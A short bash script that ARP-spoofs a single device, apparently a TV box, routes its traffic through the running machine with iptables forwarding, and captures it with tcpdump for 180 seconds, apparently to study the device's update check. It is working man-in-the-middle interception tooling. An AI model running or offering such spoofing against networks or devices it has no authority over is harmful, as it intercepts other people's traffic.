#!/bin/bash
# mitmbox.sh — ARP-redirect ONLY the box (192.0.2.126) through this VM,
# forward its traffic (so it still reaches the internet), and pcap it for 180s.
# Router and all other hosts are unaffected.
set -e
IF=enp1s0; BOX=192.0.2.126; GW=192.0.2.1
PCAP=~/tvbox/ssrf/boxcap.pcap
MAC=$(ip -br link show $IF | awk '{print $3}')
echo "iface=$IF mac=$MAC box=$BOX gw=$GW"

sysctl -qw net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o $IF -j MASQUERADE
iptables -A FORWARD -s $BOX -j ACCEPT
iptables -A FORWARD -d $BOX -j ACCEPT

rm -f $PCAP
tcpdump -i $IF -w $PCAP "host $BOX" &
TPID=$!
sleep 1
setsid python3 ~/tvbox/ssrf/minispoof.py $IF $MAC $BOX $GW 180 &
SPID=$!
echo "MITM up for 180s. Run the box update check NOW."
wait $SPID || true
kill $TPID 2>/dev/null || true
iptables -t nat -D POSTROUTING -o $IF -j MASQUERADE
iptables -D FORWARD -s $BOX -j ACCEPT
iptables -D FORWARD -d $BOX -j ACCEPT
sysctl -qw net.ipv4.ip_forward=0
echo "cleaned up. pcap at $PCAP"
